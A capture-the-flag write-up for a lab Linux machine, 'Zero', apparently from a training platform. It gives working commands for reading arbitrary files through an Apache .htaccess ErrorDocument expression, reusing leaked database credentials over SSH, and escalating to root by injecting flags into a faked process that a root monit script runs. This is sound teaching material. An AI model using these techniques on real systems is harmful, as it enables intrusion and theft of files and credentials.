# Zero

**OS:** Linux | **Difficulty:** Insane | **IP:** `<redacted>`

## Overview
Zero is a Linux machine running a "free home page hosting" web application that lets users sign up for SFTP accounts to upload static HTML pages. The attack chain starts by abusing Apache's `ErrorDocument` directive with expression-based file reading to dump PHP source code containing hardcoded MySQL credentials, which are reused for SSH. Root is obtained by exploiting a monit-driven Apache config check script — injecting extra command-line flags into a fake process to redirect Apache's config directory and startup error log, leaking root-owned files through config parse errors.

## Enumeration

### Port Scanning

**Command:**
```bash
nmap -sC -sV -p- <redacted> -oN scans/full_tcp.txt --min-rate 5000
```

**Key results:**

| Port | Service | Version | Notes |
|------|---------|---------|-------|
| 22   | SSH     | OpenSSH 8.2p1 Ubuntu | SFTP-only for registered users |
| 80   | HTTP    | Apache 2.4.41 (Ubuntu) | PHP 7.4.3, mod_userdir, mod_php7 |

Only two ports — very small attack surface. The HTTP title said "Page moved." and redirected to `/index.php`.

### Service Enumeration

**Web (port 80):**

The site is called "Zero" — a free home page hosting service. It advertises "Secure SFTP Upload" and "Static file hosting." The navbar links to `/index.php` (home) and `/stats.php` (statistics).

Key pages discovered:
- `/signup.php` — "Express checkout" with a button that calls `/get-credentials-please-do-not-spam-this-thanks.php` via AJAX
- `/stats.php` — Shows live stats: registered users, pages hosted, open web sockets, system load, uptime, admins logged in
- `/info.php` — Full phpinfo page
- `/attribution.php` — Image credits
- `/images.txt` — Image source URLs

```bash
gobuster dir -u http://zero.vl/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,txt -t 50
```

Clicking the signup button returned SFTP credentials after a 15-second wait:
```
Username: zro-7bdd52d9
Password: 0cf65919
```

The homepage mentioned uploading via `sftp://zero.vl` and pages being available at `http://zero.vl/~username`. Added `zero.vl` to `/etc/hosts`.

**SSH (port 22):**

Trying SSH with the SFTP credentials returned "This service allows sftp connections only." — so `ForceCommand internal-sftp` is configured for zro-* users.

**phpinfo highlights:**
- PHP 7.4.3 with mod_php7
- `mod_userdir` loaded — serves `~/public_html`
- `ffi` module loaded (but set to `preload` only — not exploitable)
- `mysqli` and `pdo_mysql` loaded — database backend
- `disable_functions`: only pcntl_* functions
- No `open_basedir` restriction
- `user_ini.filename`: `.user.ini`

**SFTP exploration:**

The SFTP session was chrooted to the user's home directory. The filesystem looked like:
```
/                    (root:root, drwxr-xr-x)
/public_html/        (user:user, drwxr-xr-x)
/public_html/.htaccess  (root:root) — "Header always set X-Zero-Customer 'zro-7bdd52d9'"
/public_html/index.html (user:user) — Default "Nothing here." page
```

Key observations:
- Home directory owned by root — can't create `.ssh/` or other files outside `public_html`
- `.htaccess` in `public_html` root is owned by root — can't overwrite
- Symlinks blocked (`Permission denied`)
- **Can create subdirectories in `public_html`** and write `.htaccess` there

### What Stood Out

Three things pointed toward the attack vector:

1. **We can write `.htaccess` in subdirectories** — and the userdir config allows `AllowOverride FileInfo AuthConfig Limit Indexes`
2. **PHP is disabled for user directories** — `php_admin_flag engine off` prevents PHP execution regardless of what we put in `.htaccess`
3. **Apache expressions are available** — the `ErrorDocument` directive supports `%{file:/path}` expressions that read files at the Apache level, *before* PHP processing

The combination of writable `.htaccess` + Apache expressions = arbitrary file read as www-data.

## Foothold

### The Vulnerability

Apache's `ErrorDocument` directive accepts expression syntax when the message is enclosed in quotes. The `%{file:/path}` expression reads a file from the filesystem and embeds its contents in the error response. Since this happens at the Apache layer (not PHP), it bypasses the PHP engine being disabled for user directories.

The userdir config (`/etc/apache2/mods-enabled/userdir.conf`) allows `AllowOverride FileInfo`, which permits `ErrorDocument` in `.htaccess` files.

### Exploitation — Step by Step

**Step 1: Create a subdirectory and upload a malicious .htaccess**

```bash
# Create the .htaccess with file-read expression
printf 'ErrorDocument 404 "%%{file:/etc/passwd}"\n' > /tmp/.htaccess_rf

# Upload via SFTP
sshpass -p '0cf65919' sftp zro-7bdd52d9@zero.vl <<'EOF'
cd public_html
mkdir subdir
cd subdir
put /tmp/.htaccess_rf .htaccess
EOF
```

**Step 2: Trigger the file read by requesting a nonexistent URL**

```bash
curl -s "http://zero.vl/~zro-7bdd52d9/subdir/x"
```

This returned the full `/etc/passwd` file! Notable users:
```
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
zroadmin:x:666:666::/home/zroadmin:/bin/bash
```

`zroadmin` (UID 666) has a bash shell — looks like an admin account for the hosting platform.

**Step 3: Read PHP source files to find credentials**

PHP files get executed when read via `%{file:}` (Apache embeds the content, but the response still goes through mod_php). However, using `cat -v` to view the raw response reveals the PHP source code because the error document string is rendered differently than a normal PHP response.

```bash
# Update .htaccess to read stats.php
printf 'ErrorDocument 404 "%%{file:/var/www/html/stats.php}"\n' > /tmp/.htaccess_rf
sshpass -p '0cf65919' sftp zro-7bdd52d9@zero.vl <<'EOF'
cd public_html/subdir
put /tmp/.htaccess_rf .htaccess
EOF

curl -s "http://zero.vl/~zro-7bdd52d9/subdir/x" | cat -v
```

The PHP source of `stats.php` revealed hardcoded MySQL credentials:

```php
$mysqli = new mysqli("localhost", "zroadmin", "correct-horse-battery-staple", "zro");
```

**Step 4: SSH with the found credentials**

```bash
sshpass -p 'correct-horse-battery-staple' ssh zroadmin@zero.vl id
```
```
uid=666(zroadmin) gid=666(zroadmin) groups=666(zroadmin)
```

The MySQL password was reused for the system account.

### Flag
```bash
cat /home/zroadmin/user.txt
```
`<redacted>`

## Privilege Escalation (Root)

### Situation

We have SSH as `zroadmin` (UID 666). No sudo privileges. No interesting SUID binaries. No writable scripts or cron jobs. The user is in no special groups.

### Discovery

Process listing revealed **monit** running as root:
```bash
ps aux | grep monit
```
```
root  859  /usr/bin/monit -c /etc/monit/monitrc
```

Monit's web interface was accessible on localhost:2812 with default credentials (`admin:monit`, read-only):
```bash
curl -s http://admin:monit@localhost:2812/_status?format=text
```

The monit config files in `/etc/monit/conf.d/` were world-readable:

**`/etc/monit/conf.d/zroweb.disabled`** — Despite the `.disabled` filename, monit still reads all files in `conf.d/`:
```
check process zroweb matching "^/opt/zroweb/sbin/apache2 -k start -d /opt/zroweb/conf/"
    if cpu > 101% then alert

check program zroweb-confcheck with path /usr/local/bin/zro.web-confcheck
    if status != 0 then alert
```

**`/usr/local/bin/zro.web-confcheck`** — The confcheck script:
```bash
#!/usr/bin/bash
RET=0
while read pid _cmd ; do
    cmd="${_cmd/apache2/apache2ctl} -t"
    $cmd >/dev/null 2>&1
    RET=$?
done <<< $(/usr/bin/pgrep -lfa "^/opt/zroweb/sbin/apache2.-k.start.-d./opt/zroweb/conf")
if [[ $RET -eq 0 ]] ; then
    echo 'Configuration correct. \o/'
else
    echo 'Configuration broken. Please fix immediately!' >&2
fi
exit $RET
```

This script runs every 60 seconds as root and:
1. Uses `pgrep -lfa` to find processes matching the zroweb Apache pattern
2. Replaces `apache2` with `apache2ctl` in the command line
3. Appends `-t` (config test mode)
4. **Executes the resulting command as root**

The critical insight: since `$cmd` is executed **unquoted**, all arguments are passed through to the underlying Apache binary. If we create a fake process with extra flags in its command line, those flags get passed to `apache2ctl` → `apache2` when root runs the confcheck.

### Exploitation

**Step 1: Create a malicious Apache config directory**

```bash
mkdir -p /dev/shm/malconf

cat > /dev/shm/malconf/apache2.conf << 'APACHECONF'
ServerRoot "/etc/apache2"
LoadModule mpm_prefork_module /usr/lib/apache2/modules/mod_mpm_prefork.so
LoadModule authz_core_module /usr/lib/apache2/modules/mod_authz_core.so
Include /root/root.txt
APACHECONF
```

The config loads the minimum required modules, then uses `Include` to try parsing `/root/root.txt` as Apache configuration. Since the flag is a hex string (not a valid Apache directive), this will produce a syntax error containing the flag's content.

**Step 2: Start a fake process with injected flags**

```bash
perl -e '$0 = "/opt/zroweb/sbin/apache2 -k start -d /opt/zroweb/conf -d /dev/shm/malconf -E /dev/shm/malconf/startup.log"; sleep 300' &
```

This creates a process whose command line:
- **Matches the pgrep regex** (`^/opt/zroweb/sbin/apache2.-k.start.-d./opt/zroweb/conf`)
- **Injects `-d /dev/shm/malconf`** — Apache uses the LAST `-d` flag, so this overrides the ServerRoot to our controlled directory
- **Injects `-E /dev/shm/malconf/startup.log`** — Redirects startup error output to a file we can read

After the confcheck substitution, root executes:
```
/opt/zroweb/sbin/apache2ctl -k start -d /opt/zroweb/conf -d /dev/shm/malconf -E /dev/shm/malconf/startup.log -t
```

The `apache2ctl` script falls through to its `*)` case and runs:
```
/usr/sbin/apache2 ... -k start -d /opt/zroweb/conf -d /dev/shm/malconf -E /dev/shm/malconf/startup.log -t
```

**Step 3: Wait for monit to trigger the confcheck (~60 seconds)**

```bash
sleep 75
cat /dev/shm/malconf/startup.log
```

Output:
```
AH00526: Syntax error on line 1 of /root/root.txt:
Invalid command '<redacted>', perhaps misspelled or defined by a module not included in the server configuration
```

Apache (running as root) read `/root/root.txt`, tried to parse it as a config directive, and dumped the flag content into the error message — which was written to our controlled log file.

### Flag
```bash
cat /dev/shm/malconf/startup.log | grep "Invalid command" | grep -oP "'[^']+'" | tr -d "'"
```
`<redacted>`

## Key Takeaways
- **Apache expressions in `.htaccess`** are a powerful and often-overlooked file-read primitive. `ErrorDocument 404 "%{file:/path}"` reads arbitrary files when `AllowOverride FileInfo` is set — even when PHP is disabled for the directory.
- **Monit `conf.d/` reads ALL files** regardless of extension — a file named `zroweb.disabled` is still active config. The `.disabled` suffix is just a naming convention, not a functional disable.
- **Process command-line injection via `pgrep`** — when a script uses `pgrep` to extract a command line and then executes a modified version of it, you can influence the executed command by creating a fake process with extra arguments. Perl's `$0` assignment or Python's `setproctitle` make this trivial.
- **Apache `-d` flag last-wins** — when multiple `-d` (ServerRoot) flags are given, Apache uses the last one. Combined with `-E` (startup error log), this provides both config control and output capture.
- **Password reuse** remains one of the most reliable escalation paths. The MySQL password for `zroadmin` was identical to the SSH password.

## Commands Quick Reference
```bash
# Recon
nmap -sC -sV -p- <redacted> --min-rate 5000

# Get SFTP credentials
curl -s http://zero.vl/get-credentials-please-do-not-spam-this-thanks.php

# File read via .htaccess expression
printf 'ErrorDocument 404 "%%{file:/etc/passwd}"\n' > .htaccess
# Upload to ~/public_html/subdir/.htaccess via SFTP, then:
curl -s http://zero.vl/~<username>/subdir/x

# Read PHP source (pipe through cat -v)
printf 'ErrorDocument 404 "%%{file:/var/www/html/stats.php}"\n' > .htaccess
curl -s http://zero.vl/~<username>/subdir/x | cat -v

# User — SSH with found MySQL creds
ssh zroadmin@zero.vl  # password: correct-horse-battery-staple

# Root — monit confcheck process injection
mkdir -p /dev/shm/malconf
cat > /dev/shm/malconf/apache2.conf << 'EOF'
ServerRoot "/etc/apache2"
LoadModule mpm_prefork_module /usr/lib/apache2/modules/mod_mpm_prefork.so
LoadModule authz_core_module /usr/lib/apache2/modules/mod_authz_core.so
Include /root/root.txt
EOF
perl -e '$0 = "/opt/zroweb/sbin/apache2 -k start -d /opt/zroweb/conf -d /dev/shm/malconf -E /dev/shm/malconf/startup.log"; sleep 300' &
sleep 75
cat /dev/shm/malconf/startup.log
```
